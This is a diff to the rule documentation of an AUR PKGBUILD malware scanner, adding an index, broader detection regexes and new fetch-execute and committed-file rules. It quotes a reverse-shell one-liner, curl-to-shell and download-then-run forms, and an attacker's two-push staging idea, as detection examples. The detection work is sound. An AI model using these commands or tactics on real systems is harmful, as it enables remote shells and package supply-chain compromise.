@@ -17,21 +17,66 @@ severity weights and the reserved identifier ranges.
 
 ---
 
+<!-- generated: page-index -->
+## Rules on this page
+
+| Rule | Name | Severity |
+|---|---|---|
+| [C007](#c007) | Command Substitution In Source Array | CRITICAL |
+| [R001](#r001) | Remote Script Execution | CRITICAL |
+| [R002](#r002) | Wget Pipe to Shell | CRITICAL |
+| [R006](#r006) | Insecure Download Protocol | LOW |
+| [R008](#r008) | Unexpected File Download | HIGH |
+| [R009](#r009) | Privilege Escalation | CRITICAL |
+| [R010](#r010) | Uses curl in PKGBUILD | LOW |
+| [R011](#r011) | Uses wget in PKGBUILD | LOW |
+| [R020](#r020) | Network connection attempt | CRITICAL |
+| [R022](#r022) | Sensitive binary execution | HIGH |
+| [R041](#r041) | Shell Network Redirection | CRITICAL |
+| [R042](#r042) | Download Then Execute | CRITICAL |
+| [R044](#r044) | Interpreter One-Liner With Network | HIGH |
+| [R046](#r046) | Source URL Uses IP Address | MEDIUM |
+| [R047](#r047) | Source URL Uses Non-Standard Port | LOW |
+| [R048](#r048) | Source URL On Free Registrar TLD | LOW |
+| [R051](#r051) | Network Access In pkgver | HIGH |
+| [R055](#r055) | Git Clone With Variable Branch | MEDIUM |
+| [R056](#r056) | Download Then Source | CRITICAL |
+| [R057](#r057) | TLS Verification Disabled | HIGH |
+| [R060](#r060) | Critical Build Function Modified | INFO |
+| [R061](#r061) | Hidden Network Fetch In Build | HIGH |
+| [R076](#r076) | Version-In-URL Injection | MEDIUM |
+| [R080](#r080) | Exotic Source Protocol | MEDIUM |
+| [R087](#r087) | Upload To Paste Or File-Drop Host | HIGH |
+| [R120](#r120) | Reconstructed Executable Payload | HIGH |
+| [R121](#r121) | Build-time Generation Then Execution | HIGH |
+| [R123](#r123) | Covert Egress | HIGH |
+| [R124](#r124) | Write Then Execute | HIGH |
+| [R127](#r127) | Indirect Remote Execution | CRITICAL |
+| [R129](#r129) | Parse-time Network Fetch | HIGH |
+| [R136](#r136) | Committed File Executed Without Declaration | HIGH |
+| [R137](#r137) | Fetch Then Execute | CRITICAL |
+| [R138](#r138) | Downloaded Source File Executed | HIGH |
+| [R146](#r146) | Committed Companion Carries A Fetch-Execute Payload | CRITICAL |
+| [R150](#r150) | Unread Script Executed During Packaging | HIGH |
+<!-- /generated: page-index -->
+
 ### R001: Remote Script Execution {#r001}
 
 - **Target:** `resolved`
 - **Severity:** CRITICAL (weight 40)
 - **Category:** `network_execution`
-- **Pattern:** `curl.*\|\s*(?:/bin/)?(?:bash|sh|python|zsh|dash|busybox\s+sh|source\s+/dev/stdin)`
+- **Pattern:** `curl.*(?<!\\)\|\s*(?:[({]\s*(?:(?:(?:env|exec|command|sudo|doas|nohup|setsid|nice|ionice|stdbuf|timeout|unbuffer|script)(?:\s+-[-\w]+)*(?:\s+\d+[smhd]?)?\s+|(?:xterm|u?rxvt|konsole|gnome-terminal|alacritty|kitty|wezterm|foot|terminator|xfce4-terminal|lxterminal|tilix|ttyd|zellij|chroot|bwrap|firejail|nsjail|unshare|proot|fakeroot|fakechroot|systemd-nspawn|toolbox|distrobox-enter|screen|dtach|abduco|runuser|setpriv|nohup)(?:\s+[^\s;&|]+){0,4}\s+))?(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:(?:env|exec|command|sudo|doas|nohup|setsid|nice|ionice|stdbuf|timeout|unbuffer|script)(?:\s+-[-\w]+)*(?:\s+\d+[smhd]?)?\s+|(?:xterm|u?rxvt|konsole|gnome-terminal|alacritty|kitty|wezterm|foot|terminator|xfce4-terminal|lxterminal|tilix|ttyd|zellij|chroot|bwrap|firejail|nsjail|unshare|proot|fakeroot|fakechroot|systemd-nspawn|toolbox|distrobox-enter|screen|dtach|abduco|runuser|setpriv|nohup)(?:\s+[^\s;&|]+){0,4}\s+)(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:source|\.)\s+/dev/stdin\b)`
 - **Description:** Detects `curl | bash`, `curl | sh`, and variants including `python`, `zsh`, `dash`, `busybox sh`, and `source /dev/stdin`. This is the most common careless malice pattern in AUR PKGBUILDs: downloading a script and piping it directly to a shell without verification.
+- **Note:** The lookbehind requires the pipe to be **unescaped**. `curl x \| sh` passes a literal bar to `curl` as an argument and starts no pipeline, and this rule used to fire on it - a false positive on the highest-severity rule in the set. The tokenizer keeps that escape intact (`tokenizer._ESCAPE_REMOVABLE`) so the distinction survives resolution. An installation written before 0.13.3 holds the older, wider pattern; it is registered in `LEGACY_RULE_PATTERNS`, so `trustsight config sync-rules --update` replaces it.
 
 ### R002: Wget Pipe to Shell {#r002}
 
 - **Target:** `resolved`
 - **Severity:** CRITICAL (weight 40)
 - **Category:** `network_execution`
-- **Pattern:** `wget.*\|\s*(?:/bin/)?(?:bash|sh|python|zsh|dash|busybox\s+sh|source\s+/dev/stdin)`
+- **Pattern:** `wget.*(?<!\\)\|\s*(?:[({]\s*(?:(?:(?:env|exec|command|sudo|doas|nohup|setsid|nice|ionice|stdbuf|timeout|unbuffer|script)(?:\s+-[-\w]+)*(?:\s+\d+[smhd]?)?\s+|(?:xterm|u?rxvt|konsole|gnome-terminal|alacritty|kitty|wezterm|foot|terminator|xfce4-terminal|lxterminal|tilix|ttyd|zellij|chroot|bwrap|firejail|nsjail|unshare|proot|fakeroot|fakechroot|systemd-nspawn|toolbox|distrobox-enter|screen|dtach|abduco|runuser|setpriv|nohup)(?:\s+[^\s;&|]+){0,4}\s+))?(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:(?:env|exec|command|sudo|doas|nohup|setsid|nice|ionice|stdbuf|timeout|unbuffer|script)(?:\s+-[-\w]+)*(?:\s+\d+[smhd]?)?\s+|(?:xterm|u?rxvt|konsole|gnome-terminal|alacritty|kitty|wezterm|foot|terminator|xfce4-terminal|lxterminal|tilix|ttyd|zellij|chroot|bwrap|firejail|nsjail|unshare|proot|fakeroot|fakechroot|systemd-nspawn|toolbox|distrobox-enter|screen|dtach|abduco|runuser|setpriv|nohup)(?:\s+[^\s;&|]+){0,4}\s+)(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:source|\.)\s+/dev/stdin\b)`
 - **Description:** Same as R001 but for `wget`. Separate rule per tool to allow per-tool tuning.
+- **Note:** The pipe must be **unescaped**. An escaped bar is an argument to the command and starts no pipeline, and this rule used to fire on it. The tokenizer keeps that escape intact (`tokenizer._ESCAPE_REMOVABLE`) so the distinction survives resolution. An installation written before 0.13.3 holds the wider pattern; it is registered in `LEGACY_RULE_PATTERNS`, so `trustsight config sync-rules --update` replaces it.
 
 ### R006: Insecure Download Protocol {#r006}
 
@@ -103,7 +148,7 @@ severity weights and the reserved identifier ranges.
 - **Target:** `resolved`
 - **Severity:** CRITICAL (weight 40)
 - **Category:** `network_execution`
-- **Pattern:** `/dev/(?:tcp|udp)/`
+- **Pattern:** `/dev/(?:tcp|udp)/|/dev/[a-z]*[?*\[][a-z?*\]\[]*/|/dev/\$\{?\w+\}?/`
 - **Description:** Bash's `/dev/tcp` and `/dev/udp` pseudo-devices open network sockets with no external binary. The canonical reverse shell is `bash -i >& /dev/tcp/host/port 0>&1`. Matching the bare path rather than a redirection operator covers the `>&` and `exec 3<>` forms alike.
 
 ### R042: Download Then Execute {#r042}
@@ -152,7 +197,7 @@ severity weights and the reserved identifier ranges.
 - **Severity:** HIGH (weight 25)
 - **Category:** `packaging`
 - **Scope:** `['pkgver']`
-- **Pattern:** `\b(?:curl|wget|git\s+(?:clone|fetch|pull|ls-remote)|svn\s+(?:co|checkout)|hg\s+pull)\b`
+- **Pattern:** `\b(?:curl|wget2?|aria2c|axel|lftp|ncftp(?:get)?|snarf|httpie|elinks|links2?|w3m|lynx|browsh|scp|sftp|rsync|ftp|tftp|ssh(?=\s+(?:-\S+\s+)*[\w.@-]+\s+\S)|nc|ncat|netcat|socat|telnet|openssl\s+s_client|dig|host|nslookup|drill|kdig|git\s+(?:clone|fetch|pull|ls-remote|archive)|svn\s+(?:co|checkout|export)|hg\s+(?:clone|pull|unbundle)|bzr\s+(?:branch|pull|export)|darcs\s+get|fossil\s+clone|cvs\s+(?:[-:]\S+\s+)*(?:co|checkout|export)|s3cmd\s+(?:get|sync|cp)|aws\s+s3\s+(?:cp|sync|mv)|gsutil\s+(?:cp|rsync)|az(?:copy)?\s+(?:storage\s+blob\s+download|copy)|rclone\s+(?:copy|sync|cat|copyto)|ipfs\s+(?:get|cat|dag\s+get)|swift\s+download|rados\s+get|git\s+lfs\s+(?:pull|fetch|checkout)|yt-dlp|youtube-dl|transmission-cli|aria2c(?=\s+[^\n;&|]*magnet:)|b2\s+download-file|restic\s+restore|borg\s+extract|lwp-request|lwp-download|git\s+push|fetch(?=\s+[^\n;&|]*\b(?:https?|ftps?)://))\b`
 - **Description:** `pkgver()` runs during version resolution, before a reviewer sees the build. Network access there executes ahead of any inspection step. Scoped to `pkgver` so that `curl` in `build()` is unaffected, and matched against fetching subcommands only; `git describe`, the standard VCS idiom, is local and must not fire.
 
 ### R055: Git Clone With Variable Branch {#r055}
@@ -344,7 +389,7 @@ rather than at R010/R011's "uses curl" LOW.
 
 - **Severity:** HIGH (weight 25)
 - **Category:** `execution`
-- **Condition:** An executed path is not a declared `source=()` basename, not a file the recipe wrote earlier in the same function, and not an R124-exempt build artifact, and either the path references `${startdir}`/`$startdir` or walks `../`, or the executed basename is present in the repository tree manifest under a relative path.
+- **Condition:** An executed path is not a declared `source=()` basename, not a file the recipe wrote earlier in the same function, and not an R124-exempt build artifact, and either the path references `${startdir}`/`$startdir` or walks `../`, or the executed basename is present in the repository tree manifest under a relative path. A build tool (`make`, `cmake`, `ninja`, `meson`) whose *implicit* input file is in the manifest and undeclared counts as executing it.
 
 R121/R124 own files the recipe itself writes; R118 owns committed ELF
 binaries. Between them sat the cleartext helper script: committed to the AUR
@@ -355,19 +400,39 @@ or `../` path reference (available even without a manifest), or the basename
 in the tree manifest (only when a manifest was supplied - without one the rule
 never guesses). An absolute `/usr/share/...` target cannot be a repository
 file, however its basename collides, so the manifest signal requires a
-relative path. Detected by `_committed_execution_findings()` in
+relative path.
+
+A build tool names no file on the command line, so no execution pattern saw
+one, and `make` sits in R124's benign-artifact exemption because almost every
+package runs it. The question is not the command but the file it reads: a
+`Makefile` committed to the AUR repository and absent from `source=()` is code
+with no checksum over it and nothing declaring it. The rule therefore resolves
+the implicit input of `make`/`gmake` (`GNUmakefile`, `makefile`, `Makefile`),
+`cmake` (`CMakeLists.txt`), `ninja` (`build.ninja`) and `meson`
+(`meson.build`), and fires only when that file is in the manifest and
+undeclared. A `-f` or `-C` flag names the input explicitly and is left to the
+ordinary execution patterns. All 14 diffs in the locked benign corpus that
+commit a build file declare it in `source=()`, so the arm fires on none of
+them. Detected by `_committed_execution_findings()` in
 `src/trustsight/analysis/delivery.py`.
 
 ### R137: Fetch Then Execute {#r137}
 
 - **Severity:** CRITICAL (weight 40)
 - **Category:** `network_execution`
-- **Condition:** Inside a build/package/check/prepare function (install hooks already have R062), a line downloads to a file with `curl`/`wget`/`aria2c`/`axel` (`-o`, `--output`, `--output-document`, or `>` form) and the same function later executes that file.
+- **Condition:** Inside a build/package/check/prepare function (install hooks already have R062), a line downloads to a file with `curl`/`wget`/`aria2c`/`axel` (`-o`, `--output`, `--output-document`, or `>` form) or with an interpreter one-liner (`python3 -c ... urlretrieve`, `perl -e ... getstore`, and the rest), and the same scope later executes that file. "The same scope" follows the call graph: a fetch in a helper and the execution in the `build()` that calls it are one operation.
 
 This is `curl -o stage.sh ... ; bash stage.sh` split across lines so the
 pipe-to-shell regex (R001/R002) never sees the `|`. Files that arrived via
 the declared `source=()` array are deliberately excluded - they have their
 own rule (R138), so checksum-bearing source files are not double-counted.
+
+The client list is not only `curl` and `wget`, because those are what a
+reviewer greps for: an interpreter that is already a makedepend fetches just
+as well, and `python3 -c 'import urllib.request;
+urllib.request.urlretrieve(url, "x.sh")'` writes a file the next line can run.
+The fetch and the execution are matched by *scope* rather than by enclosing
+function name, so splitting them across helpers does not separate them.
 Detected by `_fetch_then_execute_findings()` in
 `src/trustsight/analysis/delivery.py`.
 
@@ -384,3 +449,57 @@ only hidden behind the ordinary download path. Build-system scripts
 executables and stay silent; the rule targets interpreted execution of a
 downloaded script. Detected by `_source_file_execution_findings()` in
 `src/trustsight/analysis/delivery.py`.
+
+### R146: Committed Companion Carries A Fetch-Execute Payload {#r146}
+
+- **Severity:** CRITICAL (weight 40)
+- **Category:** `delivery`
+- **Condition:** A committed `.service`, `.socket`, `.timer`, `.path`,
+  `.desktop`, `.rules`, `.conf`, `.install`, `.hook`, `.patch` or `.diff`
+  whose content pipes a network fetch into an executor - or, for a patch,
+  whose *added* lines do.
+
+A `.service` whose `ExecStart=` pipes a download into a shell is the
+payload, and until now nothing read it. The diff shows the recipe staging
+the file, which is ordinary packaging and scored as such; the bytes that
+matter live in a file the diff does not touch.
+
+That split is available to an attacker as a schedule. Commit the unit in one
+push, where it is a file nobody runs. Add the `install` line in a later one,
+where the reviewer sees a single unremarkable line. Neither push contains an
+attack; both together do.
+
+The rule reads the committed file instead of inferring from the recipe. What
+it looks for is deliberately narrow - a network fetch whose output reaches
+an executor - because that is not something a unit file, a desktop entry or
+a udev rule in a package repository does for a legitimate reason. A patch is
+read by its added lines only: a hunk that *removes* a `curl … | sh` is the
+opposite of this rule's subject.
+
+Reading the content at all required a change underneath it. The tree
+manifest kept 64 bytes per file, which answers "is this an ELF" - all R118
+ever asked - and cannot answer "what does this unit run". Files whose names
+say a recipe can ship or apply them are now read to 16 KiB, with a 512 KiB
+ceiling across the whole tree, and a companion cut short by either bound
+marks the tree incomplete rather than reporting a full examination of a
+partial read.
+
+### R150: Unread Script Executed During Packaging {#r150}
+
+- **Severity:** HIGH (weight 25)
+- **Category:** `execution`
+- **Condition:** The W001 observable - a script neither declared nor
+  committed - executed inside `package()` or an install hook.
+
+`package()` stages files into `$pkgdir`. It is not where software gets
+built, and its output *is* the package. Running an unaudited script there
+is a different act from running one in `build()`.
+
+This is the scoring half of [W001](unverifiable.md#w001), and the split is
+measured rather than assumed: of the three benign corpus diffs that execute
+a script from the unpacked tree, two are in `build()` and one in
+`prepare()`. None is in `package()`. So W001 keeps weight 0 over the
+surface where the behaviour is ordinary, and the subset that is not
+ordinary is scored.
+
+Zero occurrences in the benign corpus.
